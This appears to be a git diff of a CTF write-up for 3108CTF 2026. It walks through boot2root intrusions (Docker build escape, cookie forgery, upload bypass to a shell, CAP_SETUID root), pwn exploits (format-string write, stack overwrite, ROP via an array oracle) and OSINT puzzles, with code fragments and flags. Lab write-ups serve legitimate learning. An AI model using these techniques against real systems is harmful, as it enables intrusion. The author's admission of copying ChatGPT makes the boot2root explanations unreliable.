 Once inside the container, I searched the TeamCity data directory for credentials, project secrets and SSH material. After checking the project configuration for a few minutes, I found a private key under the root project's plugin data and the embedded TeamCity database under `system`:
@@ -2474,6 +2531,8 @@ pentadbir:piper123
 
 The same password also matched the Portainer bcrypt hash found in the appliance data.
 
+#### 
+
 #### Step 4: obtain the user flag
 
 The private key belonged to the `bahtera` account, so I used it for SSH:
@@ -2509,6 +2568,8 @@ I added it on Kali:
 echo '192.168.56.110 pentadbiran-diraja.istana.bahtera' | \
   sudo tee -a /etc/hosts
 ```
+
+#### 
 
 #### Step 5: access Portainer
 
@@ -2548,6 +2609,8 @@ Direct container creation, execution and volume operations were blocked by a Doc
 
 The escape abuses a malicious `WORKDIR /proc/self/fd/<fd>` instruction. If the descriptor points into the host mount namespace, the build process can walk back to the host filesystem.
 
+#### 
+
 #### Step 6: find the vulnerable descriptor
 
 The descriptor number can change, so I probed descriptors 4 through 20 instead of assuming a fixed value:
@@ -2582,6 +2645,8 @@ done
 ```
 
 After several failed builds, descriptor 7 reached the host filesystem. A successful attempt may also print a `getcwd() failed` message before exposing host files.
+
+#### 
 
 #### Step 7: escape the build and become root
 
@@ -2628,6 +2693,8 @@ cat /root/root.txt
 3108{fa857de946c9dc988a22e7c9780e43c1}
 ```
 
+#### 
+
 #### Step 8: recover the deleted image
 
 The last objective was not stored in another flag file. After searching through `/opt`, I found a Git repository at `/opt/istana/arkib-diraja` and inspected its history:
@@ -2667,6 +2734,8 @@ The third flag was printed on the letter:
 3108{d41d8cd98f00b204e9800998ecf8427e}
 ```
 
+#### 
+
 #### Flags
 
 User:
@@ -2691,7 +2760,7 @@ Post:
 
 ## 2. Warta Kelate
 
-![Screenshot-22](screenshots/Screenshot-22.png)
+![Screenshot-22](/assets/images/ctf/3108CTF-2026/Screenshot-22.png)
 
 ### Challenge overview
 
@@ -2712,6 +2781,8 @@ Exposed /.git
   -> abuse a CAP_SETUID Python binary
   -> root
 ```
+
+#### 
 
 #### Step 1: recover the exposed Git repository
 
@@ -2735,6 +2806,8 @@ After checking the recovered commits and source tree, I found the authentication
 ```text
 kelate-warta-2010::hmac-key::jange-bagi-oghe
 ```
+
+
 
 #### Step 2: forge an administrator cookie
 
@@ -2778,6 +2851,8 @@ curl -s \
 
 HMAC-SHA256 was not broken; the key had simply been committed to an exposed repository.
 
+
+
 #### Step 3: bypass the upload restrictions
 
 The administrator dashboard had a document upload function. My first attempts with normal PHP extensions were rejected. After comparing the application validation with the nginx and PHP-FPM configuration, I found a mismatch between four controls:
@@ -2816,6 +2891,8 @@ curl -sG \
 
 The command ran as `www-data`.
 
+
+
 #### Step 4: recover the maintenance credentials
 
 Once I had command execution, I looked through the web root for configuration files and credentials. After checking the application files, I found that `config.php` was owned by `root:www-data` with mode `0640`, which meant my `www-data` shell could read it.
@@ -2851,6 +2928,8 @@ cat /home/nik/user.txt
 
 This was the **Warta Kelate (`user.txt`)** objective.
 
+
+
 #### Step 5: enumerate the privilege-escalation path
 
 From the `nik` shell, I checked sudo permissions, SUID files, Linux capabilities and unusual programs under `/usr/local/bin`. Most of the results were dead ends, but the capability search eventually pointed me to the custom audit executable:
@@ -2879,6 +2958,8 @@ Program:     Python 3.10 interpreter
 
 `warta-audit` was really a Python interpreter executable by group `nik`. Its effective `CAP_SETUID` capability allowed the process to change UID without `sudo`.
 
+
+
 #### Step 6: obtain root
 
 I used `os.setuid(0)` and replaced the process with a privilege-preserving Bash shell:
@@ -2901,6 +2982,8 @@ cat /root/root.txt
 
 This was the **Warta Kelate (`root.txt`)** objective.
 
+
+
 #### Flags
 
 User:
@@ -2915,21 +2998,27 @@ Root:
 3108{cf1bd2eb6bd2fe7bb343a76fd5fe4363}
 ```
 
----
+
+
+Honestly I cant comment on this B2R since I really just heavily copy paste ChatGPT for explanation and what to do next. Sorry mayn.
 
 ---
 
-# PWN
+---
+
+## PWN
 
 ---
 
 ## 1. Warkah Diraja
 
-![Screenshot-23](screenshots/Screenshot-23.png)
+![Screenshot-23](/assets/images/ctf/3108CTF-2026/Screenshot-23.png)
 
 ### Challenge overview
 
 The story hinted that the program copied input without validation and protected its archive with a filename. I started by testing for a format-string bug.
+
+
 
 #### Discovering the format-string vulnerability
 
@@ -2942,6 +3031,8 @@ I placed a recognizable 64-bit sentinel after the format string and probed posit
 ```
 
 Once the service printed the sentinel, I knew which argument index referred to my packed address.
+
+
 
 #### Understanding the reference leak
 
@@ -2964,6 +3055,8 @@ I calculated the write target with:
 ```python
 digit_target = reference - 0x20 + len("warkah_")
 ```
+
+
 
 #### Constructing the `%hn` write
 
@@ -2988,6 +3081,8 @@ I placed the address of the two filename digits at the stack slot I had identifi
 1. `printf` changed `00` to `31`;
 2. the `DAULAT` path opened `warkah_31.txt`; and
 3. the service returned its contents.
+   
+   
 
 #### Flag
 
@@ -2995,15 +3090,11 @@ I placed the address of the two filename digits at the stack slot I had identifi
 3108{T1t4h_B0c0r_d4r1_1ng4tan_I5tan4}
 ```
 
-#### Why the exploit worked
-
-The `%n` family turned the format string into a write primitive. Since the permitted and secret filenames differed by only two adjacent bytes, one `%hn` write was enough.
-
 ---
 
 ## 2. Cogan Alam
 
-![Screenshot-24](screenshots/Screenshot-24.png)
+![Screenshot-24](/assets/images/ctf/3108CTF-2026/Screenshot-24.png)
 
 ### Challenge overview
 
@@ -3018,6 +3109,8 @@ leak the current Tera
   -> make Darjat equal Tera
   -> reach the flag branch
 ```
+
+
 
 #### Initial inspection
 
@@ -3044,6 +3137,8 @@ This showed that the program printed the required `Tera` value before reading my
 ```bash
 objdump -d -M intel cogan_alam | sed -n '/<main>:/,/^$/p'
 ```
+
+
 
 #### Finding the stack-variable overwrite
 
@@ -3079,6 +3174,8 @@ There was no need for a ROP chain, shellcode, or canary bypass. I only needed 64
 ```python
 payload = b"A" * 64 + struct.pack("<I", tera)
 ```
+
+
 
 #### Keeping the leak and payload on one connection
 
@@ -3137,21 +3234,19 @@ python3 solve_cogan.py
 
 The script parsed the current `Tera`, packed it as a little-endian 32-bit integer and placed it directly over `darjat`. The comparison succeeded and the service returned the flag.
 
+
+
 #### Flag
 
 ```text
 3108{c0g4n_4l4m_d1dukung_d4rj4t_d1r3but}
 ```
 
-#### Why the exploit worked
-
-The input buffer and security value were adjacent on the stack, but the program read eight bytes beyond the end of the buffer. Since it also disclosed the randomized comparison value before accepting input, I could overwrite `darjat` with the exact value expected for that connection. The randomization offered no protection once both the leak and overflow were handled in the same session.
-
 ---
 
 ## 3. Majlis Raja Raja
 
-![Screenshot-25](screenshots/Screenshot-25.png)
+![Screenshot-25](/assets/images/ctf/3108CTF-2026/Screenshot-25.png)
 
 ### Challenge overview
 
@@ -3173,6 +3268,8 @@ out-of-bounds array index
   -> print the flag
 ```
 
+
+
 #### Initial inspection
 
 I started by checking the binary and searching for interesting strings:
@@ -3191,6 +3288,8 @@ The binary was static and non-PIE, so the ROP gadgets and libc wrapper addresses
 ```
 
 That was the real server-side flag path. My first ROP attempt used `/flag`; the chain returned normally but printed nothing useful. After searching the ELF more carefully, I found `ketetapan.txt` and corrected the path.
+
+
 
 #### Understanding the byte oracle
 
@@ -3228,6 +3327,8 @@ def recover_or_write_byte(index, replacement=None):
             high = guess - 1
 ```
 
+
+
 #### Calculating the stack addresses
 
 From the disassembly and local testing, I found the caller's saved `RBP` at oracle index 42. Leaking eight bytes from that position gave me a stack pointer despite ASLR.
@@ -3251,6 +3352,8 @@ buffer_address = oracle_base + BUF_INDEX
 ```
 
 Since I was writing directly beyond the array, I could replace the saved return address without corrupting the stack canary.
+
+
 
 #### Building the ROP chain
 
@@ -3299,6 +3402,8 @@ chain = [
 ```
 
 This produced a 240-byte chain. Together with the path and initial stack leak, it still fit within the 2,600 available rounds.
+
+
 
 #### Final exploit
 
@@ -3434,35 +3539,31 @@ if match:
 
 After roughly 2,100 oracle rounds, the ROP chain was complete. I sent invalid indexes for the remaining turns, allowed the function to return into the overwritten saved address and received the contents of `ketetapan.txt`.
 
+
+
 #### Flag
 
 ```text
 3108{M4jl1s_B3rsur4i_T1t4h_T3rm3ter4i}
 ```
 
-#### Why the exploit worked
-
-The unchecked index exposed stack memory beyond the nine-byte array. The comparison responses turned that access into a byte leak, while the equality branch turned it into an arbitrary byte write. Leaking one saved stack pointer defeated ASLR for the stack and the static non-PIE binary supplied fixed ROP addresses. With enough rounds to write the path and chain byte by byte, I could perform a seccomp-compatible ORW operation and print the flag file.
-
 ---
 
 ---
 
-# OSINT
+## OSINT
 
 ---
 
 ## 1. Taman Hati
 
-![Screenshot-26](screenshots/Screenshot-26.png)
+![Screenshot-26](/assets/images/ctf/3108CTF-2026/Screenshot-26.png)
 
 ### Challenge Overview
 
 Basically I need to find a place from an image:
 
-![Screenshot-31](screenshots/Screenshot-31.png)
-
-
+![Screenshot-31](/assets/images/ctf/3108CTF-2026/Screenshot-31.png)
 
 Which if you Google reverse image, the Google AI will tell you that its Padang Maziah. The tricky part is finding the latitude and longitude. After several bruteforce attempt of the latitude and longitude I finally get the flag. I hate the challenge creator sm.
 
@@ -3478,7 +3579,7 @@ Which if you Google reverse image, the Google AI will tell you that its Padang M
 
 ## 2. Sebuah Istana
 
-![Screenshot-27](screenshots/Screenshot-27.png)
+![Screenshot-27](/assets/images/ctf/3108CTF-2026/Screenshot-27.png)
 
 ### Challenge overview
 
@@ -3490,6 +3591,8 @@ The challenge showed a photograph of a royal palace and gave several clues:
 - I had to identify the last younger sibling of the ruler associated with it.
 
 This was an OSINT challenge, so the main difficulty was following the relationship between the building, the ruler and his family tree without mixing up similarly named palaces or members of the Selangor royal family.
+
+
 
 #### Identifying the palace
 
@@ -3506,6 +3609,8 @@ istana dibina zaman Sultan Alaeddin Sulaiman Shah
 ```
 
 The historical clue connected the palace with **Sultan Alaeddin Sulaiman Shah**, the fifth Sultan of Selangor. Once I had the ruler's name, the question changed from identifying a building to reconstructing a family relationship.
+
+
 
 #### Tracing the royal family
 
@@ -3529,6 +3634,8 @@ I cross-checked the names against the [Royal Ark genealogy for Selangor](https:/
 
 The wording *adinda beliau yang terakhir* referred to the last younger sibling in that sequence. This ruled out the Sultan's children and later members of the Selangor royal family who had similar names.
 
+
+
 #### Formatting the answer
 
 The full answer was:
@@ -3538,6 +3645,8 @@ Raja Chik binti Raja Muda Musa
 ```
 
 I replaced the spaces with underscores and used the capitalization accepted by the challenge.
+
+
 
 #### Flag
 
@@ -3549,7 +3658,7 @@ I replaced the spaces with underscores and used the capitalization accepted by t
 
 ## 3. Kudrat Raja Berdaulat
 
-![Screenshot-28](screenshots/Screenshot-28.png)
+![Screenshot-28](/assets/images/ctf/3108CTF-2026/Screenshot-28.png)
 
 ### Challenge overview
 
@@ -3564,6 +3673,8 @@ Flag format: 3108{md5hash}
 ```
 
 I had to identify the *sang durjana* mentioned by the clue and submit the MD5 hash of its name. The wording sounded like a reference to a Malay royal legend rather than a modern person or event.
+
+
 
 #### Narrowing down the historical reference
 
@@ -3582,6 +3693,8 @@ I then treated each part of the clue separately. The ruler protects the people, 
 
 After trying combinations involving Malay royal weapons and legendary enemies, I found references to **Pedang Cura Si Manja Kini**, one of the royal regalia of Perak. This was the first result that connected all the clues instead of only matching one or two words.
 
+
+
 #### Identifying the durjana
 
 I verified the story using the [official website of the Sultan of Perak](https://sultan.perak.gov.my/index.php/informasi-kesultanan/alat-alat-kebesaran-negeri-perak). Its description of Pedang Cura Si Manja Kini explains that Sang Sapurba ordered Permasku Mambang to kill a naga named **Saktimuna** with the sword because it was threatening the people of Minangkabau.
@@ -3594,6 +3707,8 @@ That gave me a direct mapping between the challenge wording and the legend:
 - *ancaman durjana* was the naga **Saktimuna**.
 
 The image clue also made more sense after finding the sword. The same official account says that *Cura Si Manja Kini* derives from the Sanskrit *Churiga (Si) Mandakini*, referring to Mandakini near the Ganges. The river landscape was therefore likely an indirect hint towards the sword and its legend.
+
+
 
 #### Generating the flag
 
@@ -3610,6 +3725,8 @@ dd79694c1f762ec389a2f5f5450d955c  -
 ```
 
 I placed that digest inside the required flag wrapper and submitted it successfully.
+
+
 
 #### Flag
 
